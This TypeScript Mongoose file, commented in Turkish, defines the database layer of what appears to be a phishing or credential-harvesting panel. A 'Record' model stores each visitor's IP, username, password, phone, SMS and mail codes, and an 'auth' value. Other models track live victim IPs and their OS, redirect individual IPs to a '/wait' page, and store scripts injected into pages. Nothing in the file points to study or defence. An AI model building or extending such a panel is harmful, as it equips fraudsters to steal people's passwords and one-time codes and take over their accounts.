import mongoose, { Schema } from 'mongoose';

/**
 * MongoDB URI'yi build için oluşturulan benzersiz veritabanı adıyla günceller
 */
function getMongoUriWithUniqueDb(baseUri: string): string {
  // Veritabanı adını environment variable'dan al
  const dbName = process.env.DEPLOY_DB_NAME;
  
  if (!dbName) {
    console.warn('DEPLOY_DB_NAME bulunamadı, varsayılan veritabanı kullanılacak');
    return baseUri;
  }
  
  // URI'yi ayrıştır
  const lastSlash = baseUri.lastIndexOf('/');
  
  // Eğer URI'de / yoksa, sonuna benzersiz veritabanı adı ekle
  if (lastSlash === -1) {
    return `${baseUri}/${dbName}`;
  }
  
  // Eğer URI'de / varsa, sonuncu / sonrasını değiştir
  const baseUriWithoutDb = baseUri.substring(0, lastSlash);
  return `${baseUriWithoutDb}/${dbName}`;
}

// MongoDB bağlantı bilgilerini al
let MONGO_URI = process.env.MONGO_URI;

// Her deploy'da yeni bir veritabanı kullan
if (process.env.USE_PROJECT_DB === 'true' && MONGO_URI) {
  MONGO_URI = getMongoUriWithUniqueDb(MONGO_URI);
  console.log('MongoDB benzersiz veritabanı bağlantısı:', MONGO_URI.replace(/\/\/[^:]+:[^@]+@/, '//****:****@'));
}

// Mongoose bağlantısı
const connectMongoDB = async () => {
  if (!MONGO_URI) {
    throw new Error('MongoDB URI bulunamadı');
  }
  
  try {
    if (mongoose.connection.readyState === 0) {
      await mongoose.connect(MONGO_URI);
      console.log('MongoDB bağlantısı başarılı');
      
      if (mongoose.connection.db) {
        console.log('Veritabanı adı:', mongoose.connection.db.databaseName);
      }
      console.log('Bağlantı durumu:', mongoose.connection.readyState);
    }
  } catch (error) {
    console.error('MongoDB bağlantı hatası:', error);
  }
};
// ... Geri kalan şema tanımlamaları aynı kalacak

// ... Geri kalan şema tanımlamaları aynı kalacak

// Record Şeması
const recordSchema = new Schema({
  ipAddress: { type: String, required: true },
  username: { type: String, default: '' },
  password: { type: String, default: '' },
  phone: { type: String, default: '' },
  phone_sms: { type: String, default: '' },
  mail_sms: { type: String, default: '' },
  hotmail: { type: String, default: '' },
  auth: { type: String, default: '' },
  createdAt: { type: Date, default: Date.now }
}, {
  collection: 'records',
  timestamps: true
});

// Admin Şeması
const adminSchema = new Schema({
  username: { type: String, required: true, unique: true },
  password: { type: String, required: true },
  isActive: { type: Boolean, default: true }
}, {
  collection: 'admins',
  timestamps: true
});

// Active IP Şeması
const activeSchema = new Schema({
  ipAddress: { type: String, required: true },
  lastSeen: { type: Date, default: Date.now },
  isActive: { type: Boolean, default: true },
  os: { type: String, default: 'Bilinmiyor' }
}, {
  collection: 'active_ips',
  timestamps: true
});

// Redirect Şeması
const redirectSchema = new Schema({
  ipAddress: { type: String, required: true },
  page: { type: String, default: '/wait' },
  createdAt: { type: Date, default: Date.now }
}, {
  collection: 'redirects',
  timestamps: true
});

// Script Şeması
const scriptSchema = new Schema({
  name: { type: String, required: true },
  content: { type: String, required: true },
  placement: { type: String, enum: ['head', 'body'], default: 'head' },
  isActive: { type: Boolean, default: true },
  createdAt: { type: Date, default: Date.now },
  updatedAt: { type: Date, default: Date.now }
}, {
  collection: 'scripts',
  timestamps: true
});

// Modelleri tanımlama
export const Record = mongoose.models.Record || mongoose.model('Record', recordSchema);
export const Admin = mongoose.models.Admin || mongoose.model('Admin', adminSchema);
export const Active = mongoose.models.Active || mongoose.model('Active', activeSchema);
export const Redirect = mongoose.models.Redirect || mongoose.model('Redirect', redirectSchema);
export const Script = mongoose.models.Script || mongoose.model('Script', scriptSchema);

export { connectMongoDB }; 